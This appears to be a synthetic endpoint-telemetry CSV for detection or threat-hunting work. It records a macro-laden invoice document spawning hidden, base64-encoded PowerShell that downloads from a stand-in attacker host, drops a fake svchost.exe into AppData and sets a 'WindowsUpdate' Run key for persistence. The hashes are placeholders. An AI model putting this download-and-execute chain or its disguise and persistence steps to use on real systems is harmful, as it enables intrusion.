event.time,event.type,endpoint.name,site.name,src.process.storyline.id,src.process.uid,src.process.pid,src.process.name,src.process.cmdline,src.process.image.path,src.process.image.sha256,src.process.publisher,src.process.verifiedStatus,src.process.user,src.process.parent.pid,src.process.parent.name,src.process.parent.cmdline,src.process.parent.uid,tgt.file.path,tgt.file.sha256,tgt.process.name,tgt.process.pid,src.ip.address,src.port.number,dst.ip.address,dst.port.number,event.network.protocolName,dns.request,dns.response,registry.keyPath,registry.value,module.path,module.sha1
2026-04-15T14:02:11.123Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-explorer,4288,explorer.exe,C:\Windows\Explorer.EXE,C:\Windows\explorer.exe,e6a5d6a25ee9aaaaaaaa11111111aaaaaaaa,Microsoft Windows,signed,GARLAND\jdoe,1024,userinit.exe,,uid-userinit,,,,,,,,,,,,,,
2026-04-15T14:05:43.001Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-outlook,4512,OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,bbbb1111aaaa2222bbbb3333cccc4444,Microsoft Corporation,signed,GARLAND\jdoe,4288,explorer.exe,,uid-explorer,,,,,,,,,,,,,,
2026-04-15T14:12:09.882Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-winword,5104,WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n ""C:\Users\jdoe\Downloads\Invoice_Q2.docm""",C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,cccc2222bbbb3333dddd4444eeee5555,Microsoft Corporation,signed,GARLAND\jdoe,4512,OUTLOOK.EXE,,uid-outlook,,,,,,,,,,,,,,
2026-04-15T14:12:14.221Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-cmd-1,6204,cmd.exe,"cmd.exe /c powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AYgBhAGQALgBleAAuAGMAbwBtAC8AcAAuAHAAcwAxAA==",C:\Windows\System32\cmd.exe,dddd3333cccc4444eeee5555ffff6666,Microsoft Windows,signed,GARLAND\jdoe,5104,WINWORD.EXE,,uid-winword,,,,,,,,,,,,,,
2026-04-15T14:12:14.498Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-ps-1,6388,powershell.exe,"powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AYgBhAGQALgBleAAuAGMAbwBtAC8AcAAuAHAAcwAxAA==",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,eeee4444dddd5555ffff6666aaaa7777,Microsoft Windows,signed,GARLAND\jdoe,6204,cmd.exe,"cmd.exe /c powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AYgBhAGQALgBleAAuAGMAbwBtAC8AcAAuAHAAcwAxAA==",uid-cmd-1,,,,,,,,,,,,,,
2026-04-15T14:12:15.102Z,DNS Resolved,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-ps-1,6388,powershell.exe,"powershell.exe -nop -w hidden -enc SQBu...",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,eeee4444dddd5555ffff6666aaaa7777,Microsoft Windows,signed,GARLAND\jdoe,6204,cmd.exe,,uid-cmd-1,,,,,,,,,bad.example.com,185.220.101.45,,,,
2026-04-15T14:12:15.488Z,IP Connect,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-ps-1,6388,powershell.exe,"powershell.exe -nop -w hidden -enc SQBu...",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,eeee4444dddd5555ffff6666aaaa7777,Microsoft Windows,signed,GARLAND\jdoe,6204,cmd.exe,,uid-cmd-1,,,,,10.10.20.55,49981,185.220.101.45,443,TCP,,,,,,
2026-04-15T14:12:16.001Z,File Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-ps-1,6388,powershell.exe,"powershell.exe -nop -w hidden -enc SQBu...",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,eeee4444dddd5555ffff6666aaaa7777,Microsoft Windows,signed,GARLAND\jdoe,6204,cmd.exe,,uid-cmd-1,C:\Users\jdoe\AppData\Roaming\svchost.exe,ffff5555eeee6666dddd7777cccc8888,,,,,,,,,,,,
2026-04-15T14:12:21.336Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-stage2,7012,svchost.exe,C:\Users\jdoe\AppData\Roaming\svchost.exe,C:\Users\jdoe\AppData\Roaming\svchost.exe,ffff5555eeee6666dddd7777cccc8888,,unsigned,GARLAND\jdoe,6388,powershell.exe,"powershell.exe -nop -w hidden -enc SQBu...",uid-ps-1,,,,,,,,,,,,,,
2026-04-15T14:12:25.119Z,Registry Value Modified,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-stage2,7012,svchost.exe,C:\Users\jdoe\AppData\Roaming\svchost.exe,C:\Users\jdoe\AppData\Roaming\svchost.exe,ffff5555eeee6666dddd7777cccc8888,,unsigned,GARLAND\jdoe,6388,powershell.exe,,uid-ps-1,,,,,,,,,,,HKU\S-1-5-21-...\Software\Microsoft\Windows\CurrentVersion\Run,WindowsUpdate,,
